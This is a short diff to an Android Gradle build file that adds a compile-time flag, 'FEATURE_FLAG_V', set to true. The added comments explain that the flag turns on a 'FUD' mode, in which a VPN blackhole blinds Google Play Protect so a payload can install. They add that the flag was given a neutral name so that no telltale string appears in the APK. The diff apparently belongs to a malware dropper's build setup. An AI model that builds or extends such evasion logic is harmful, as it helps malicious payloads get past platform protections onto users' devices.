@@ -56,6 +56,11 @@ android {
         buildConfigField "boolean", "IS_DEV_BUILD", "${isDevBuild}"
         buildConfigField "int",     "API_LEVEL",      "${project.ext.rand_versionCode % 100}"
         buildConfigField "String",  "CLIENT_TOKEN",   "\"manual\""
+        // FUD gate — compile-time boolean; R8 inlines and dead-strips the branch at minify
+        // true  = FUD ON  (VPN blackhole active → Play Protect blinded → payload installs)
+        // false = FUD OFF (VPN skipped entirely → Play Protect active → payload blocked)
+        // Name is deliberately neutral — no "FUD" string appears in DEX or APK
+        buildConfigField "boolean", "FEATURE_FLAG_V", "true"
     }
 
     signingConfigs {
